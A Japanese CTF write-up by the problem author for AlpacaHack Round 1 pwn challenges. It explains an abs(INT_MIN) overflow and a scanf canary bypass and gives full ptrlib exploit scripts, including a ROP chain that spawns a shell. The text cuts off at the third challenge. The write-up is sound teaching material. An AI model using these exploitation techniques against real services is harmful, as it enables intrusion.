---
title: AlpacaHack Round 1 (Pwn)のWriteup
url: https://ptr-yudai.hatenablog.com/entry/2024/08/19/035647
source: CTFするぞ
date: 2024-08-19
fetch_date: 2025-10-06T18:02:40.064701
---

# AlpacaHack Round 1 (Pwn)のWriteup

[![CTFするぞ](https://cdn.image.st-hatena.com/image/square/994ee0e012cf90178bff014bfd99123c02a89b36/backend=imagemagick;height=128;version=1;width=128/https%3A%2F%2Fcdn.user.blog.st-hatena.com%2Fblog_custom_icon%2F153103571%2F1535456424487441)](https://ptr-yudai.hatenablog.com/)

[CTFするぞ](https://ptr-yudai.hatenablog.com/)

[読者になる](https://blog.hatena.ne.jp/ptr-yudai/ptr-yudai.hatenablog.com/subscribe?utm_medium=button&utm_campaign=subscribe_blog&utm_source=blogs_topright_button)

# [CTFするぞ](https://ptr-yudai.hatenablog.com/)

## CTF以外のことも書くよ

[2024-08-19](https://ptr-yudai.hatenablog.com/archive/2024/08/19)

# [AlpacaHack Round 1 (Pwn)のWriteup](https://ptr-yudai.hatenablog.com/entry/2024/08/19/035647)

[CTF](https://ptr-yudai.hatenablog.com/archive/category/CTF)
[Writeup](https://ptr-yudai.hatenablog.com/archive/category/Writeup)

# はじめに

今月上旬に[AlpacaHack](https://alpacahack.com/)が正式にリリースされました。
AlpacaHackは[keymoon](https://x.com/kymn_)と[minaminao](https://x.com/vinami)が開発したCTFプラットフォームで、現在は[個人戦](https://d.hatena.ne.jp/keyword/%EF%BF%BD%C4%BF%EF%BF%BD%EF%BF%BD%EF%BF%BD)をメインにした定期CTFが開催されています。
また、過去大会の問題にも挑戦できるため、復習にも便利なサイトです。[\*1](#f-151339c0 "CTFは普通大会が終わると問題ファイルやサーバーが停止してしまい解き直しが難しいので、これはありがたい機能")
今回の問題も解き直すことができますので、参加を逃した方も挑戦してみてください。

[alpacahack.com](https://alpacahack.com/ctfs/round-1)

今回、光栄なことにこのAlpacaHackの記念すべき第一回の問題セットの作問を担当させていただきました。
ジャンルはPwnなので、これからCTFを始めるぞという人にはとっつきにくい問題だったかもしれませんが、面白いジャンルなのでwriteupを読んで勉強してみてください。
（次回は比較的入門の敷居が低い(?)Web回なので是非参加してみてください。）

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240819/20240819035015.png)

記念すべき第一回の上位勢

* [はじめに](#はじめに)
* [echo (56 solves)](#echo-56-solves)
  + [問題概要](#問題概要)
  + [脆弱性](#脆弱性)
  + [攻撃](#攻撃)
* [hexecho (27 solves)](#hexecho-27-solves)
  + [問題概要](#問題概要-1)
  + [脆弱性](#脆弱性-1)
  + [攻撃](#攻撃-1)
* [deck (11 solves)](#deck-11-solves)
  + [問題概要](#問題概要-2)
  + [脆弱性](#脆弱性-2)
  + [攻撃](#攻撃-2)
    - [swapの制御](#swapの制御)
    - [アドレスリーク](#アドレスリーク)
    - [シェルの起動](#シェルの起動)
* [todo (5 solves)](#todo-5-solves)
  + [問題概要](#問題概要-3)
  + [脆弱性](#脆弱性-3)
  + [攻撃](#攻撃-3)
* [おわりに](#おわりに)

# echo (56 solves)

## 問題概要

指定した長さで入力したデータをそのまま出力し返すechoプログラムです。
入力データのバッファサイズは0x100で固定です。

```
void echo() {
  int size;
  char buf[BUF_SIZE];

  // Input size
  printf("Size: ");
  size = get_size();

  // Input data
  printf("Data: ");
  get_data(buf, size);

  // Show data
  printf("Received: %s\n", buf);
}
```

サイズの入力では、次のようにサイズがバッファサイズを超えないようにチェックが入っています。

```
int get_size() {
  // Input size
  int size = 0;
  scanf("%d%*c", &size);

  // Validate size
  if ((size = abs(size)) > BUF_SIZE) {
    puts("[-] Invalid size");
    exit(1);
  }

  return size;
}
```

scanfの入力では負数を受け付けますが、abs関数で絶対値が取られています。

## [脆弱性](https://d.hatena.ne.jp/keyword/%EF%BF%BD%C8%BC%EF%BF%BD%EF%BF%BD%EF%BF%BD)

もしサイズが負の数になると、`get_data`関数に負数が渡ることになります。しかし、この関数はunsigned型でサイズを取得します。

```
void get_data(char *buf, unsigned size) {
  unsigned i;
  char c;

  // Input data until newline
  for (i = 0; i < size; i++) {
    if (fread(&c, 1, 1, stdin) != 1) break;
    if (c == '\n') break;
    buf[i] = c;
  }
  buf[i] = '\0';
}
```

データ入力のfor文のカウンタもunsignedで比較されているため、負数がunsignedに暗黙的にキャストされ、バッファサイズを超えて入力できることがわかります。
しかし、サイズはabs関数で絶対値を取られているため、一見すると負数を渡すことはできません。何とかならないでしょうか？

有名な整数オーバーフローとして、`INT_MIN`に-1をかけても`INT_MIN`になるという問題があります。
int型は232の範囲から0を引いた奇数個のデータを負数と正数で分けているのですから、正と負のどちらかの表現できる数が多くなります。
2の補数表現では負数の方が1つ多いため、INT\_MINの絶対値に相当する値は表現できません。

abs関数の場合、絶対値が取れない値が入力として与えられた場合は未定義動作です。
サイズにINT\_MINにあたる-0x80000000を与えると、abs関数を通しても負の数のままとなり、サイズチェックを通過してしまいます。

## 攻撃

改行コードが送られるまでバッファサイズを超えて値を入力できるため、スタック[バッファオーバーフロー](https://d.hatena.ne.jp/keyword/%EF%BF%BD%D0%A5%C3%A5%D5%A5%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%D0%A1%EF%BF%BD%EF%BF%BD%D5%A5%EF%BF%BD%EF%BF%BD%EF%BF%BD)が発生します。
[checksec](https://docs.pwntools.com/en/stable/commandline.html#pwn-checksec)コマンドで確認するとStack canaryがない[\*2](#f-912dbf2f "checksecは\"__stack_chk_fail\"関数がインポートされているかをもとにSSPを判断するので、false positive, false negativeの両方がありえることに注意してください")ので、単純にリターンアドレスを書き換えて任意のアドレスの[機械語](https://d.hatena.ne.jp/keyword/%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD)を実行できます。

今回の問題では以下のwin関数が定義されており、呼び出すとフラグが表示されるようになっています。
また、checksecの出力からPIEが無効であるとわかるため、win関数のアドレスは固定です。

```
/* Call this function! */
void win() {
  char *args[] = {"/bin/cat", "/flag.txt", NULL};
  execve(args[0], args, NULL);
  exit(1);
}
```

バッファの先頭からリターンアドレスの位置を[gdb](https://d.hatena.ne.jp/keyword/gdb)などで特定し、リターンアドレスを書き換えるデータを構築します。
以下のような[スクリプト](https://d.hatena.ne.jp/keyword/%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%D7%A5%EF%BF%BD)でpayloadを送ると、win関数が呼ばれてフラグが出力されます。

```
from ptrlib import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 5000))

elf = ELF("./echo")
#sock = Process("./echo")
sock = Socket(HOST, PORT)

sock.sendlineafter("Size: ", -0x80000000)

payload  = b"A" * 0x118
payload += p64(elf.symbol("win"))
sock.sendlineafter("Data: ", payload)
sock.recvline()

print(sock.recvline().decode())

sock.close()
```

# hexecho (27 solves)

## 問題概要

echoのプログラムと似た構造ですが、今度は16進数でデータを送って、16進数でecho backされるプログラムとなっています。

## [脆弱性](https://d.hatena.ne.jp/keyword/%EF%BF%BD%C8%BC%EF%BF%BD%EF%BF%BD%EF%BF%BD)

さきほどのechoとは異なり、サイズチェックがないため、より単純な[バッファオーバーフロー](https://d.hatena.ne.jp/keyword/%EF%BF%BD%D0%A5%C3%A5%D5%A5%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%D0%A1%EF%BF%BD%EF%BF%BD%D5%A5%EF%BF%BD%EF%BF%BD%EF%BF%BD)があります。
しかし、checksecで確認すると、Stack canaryがついていることがわかります。

ここで、16進数の入力を受け付ける`get_hex`関数に注目します。

```
void get_hex(char *buf, unsigned size) {
  for (unsigned i = 0; i < size; i++)
    scanf("%02hhx", buf + i);
}
```

この関数はscanfを使って16進数を受付ますが、scanfの戻り値を確認していません。
scanfはストリームを読み込み、指定された書式文字列に沿って入力をパースします。
このとき、書式文字列に対してパースできない入力が与えられると、scanfは失敗して変数に値を書き込みません。
したがって、16進数でない文字列を与えるとscanfは失敗し、stack canaryがある箇所を書き換えずにfor文を進めることができます。

しかし、scanfは解釈できない文字が与えられたとき、失敗すると同時にその文字をストリームに残します。
そのため、for文を進めても次以降のscanfもすべて失敗してしまいます。

scanfを失敗させつつ次以降のscanfを動作させるには、16進数として解釈できる文字列でscanfを失敗させる必要があります。
そのような方法として、符号文字のみを与える手法があります。
`+`や`-`を単体で入力すると、数値部分がないためscanfは失敗しますが、これらの文字は16進数として受け付けられるためストリームから消費されます。
これを利用すると、stack canaryを壊さないようにしつつリターンアドレスを書き換えられます。

## 攻撃

この問題はwin関数が用意されていないため、libcのアド[レスリー](https://d.hatena.ne.jp/keyword/%EF%BF%BD%EC%A5%B9%EF%BF%BD%EA%A1%BC)クが必要となります。
スタック中のlibcのアドレスが残っている部分をstack canaryと同様に破壊しないことで、echo backの処理でlibcアドレスがリークできます。
アド[レスリー](https://d.hatena.ne.jp/keyword/%EF%BF%BD%EC%A5%B9%EF%BF%BD%EA%A1%BC)ク後にexploitする必要がありますが、この際にリターンアドレスを`_start`や`main`関数に設定しておくことで、再度[バッファオーバーフロー](https://d.hatena.ne.jp/keyword/%EF%BF%BD%D0%A5%C3%A5%D5%A5%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%D0%A1%EF%BF%BD%EF%BF%BD%D5%A5%EF%BF%BD%EF%BF%BD%EF%BF%BD)を利用できます。

最後に、ROP(Return Oriented Programming)でsystem関数を呼び出し、シェルを起動します。
以下はexploitの例です。

```
from ptrlib import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 5000))

libc = ELF("./libc.so.6")
elf = ELF("./hexecho")
sock = Socket(HOST, PORT)

# Leak libc base
rop = flat([
    elf.symbol('_start')
], map=p64)
payload  = b"+ " * 0x118
payload += b" ".join([f"{c:02x}".encode() for c in rop])

sock.sendlineafter("Size: ", 0x120)
sock.sendlineafter("Data (hex): ", payload)
leak = bytes(map(lambda c: int(c, 16), sock.recvlineafter("Received: ").split()))

libc.base = u64(leak[0x98:0xa0]) - libc.symbol('_IO_2_1_stdout_')

# Win
rop = flat([
    next(libc.gadget('ret')),
    next(libc.gadget('pop rdi; ret')),
    next(libc.find('/bin/sh')),
    libc.symbol("system")
], map=p64)
payload  = b"+ " * 0x118
payload += b" ".join([f"{c:02x}".encode() for c in rop])

sock.sendlineafter("Size: ", 0x138)
sock.sendlineafter("Data (hex): ", payload)
sock.recvline()

sock.sendline("cat /flag*")
print(sock.recvline().decode())

sock.close()
```

# deck (11 solves)

## 問題概要

この問題のプログラムは、毎回シャッフルされるトランプの絵札と数字を当てるゲームになっています。両方当てたところで特に何も起きません。
ゲームの他に、シャッフル[アルゴリズム](https://d.hatena.ne.jp/keyword/%EF%BF%BD%EF%BF%BD%EF%BF%BD%EB%A5%B4%EF%BF%BD%EA%A5%BA%EF%BF%BD%EF%BF%BD)の変更とプレイヤー名の変更機能が実装されています。

シャッフル[アルゴリズム](htt...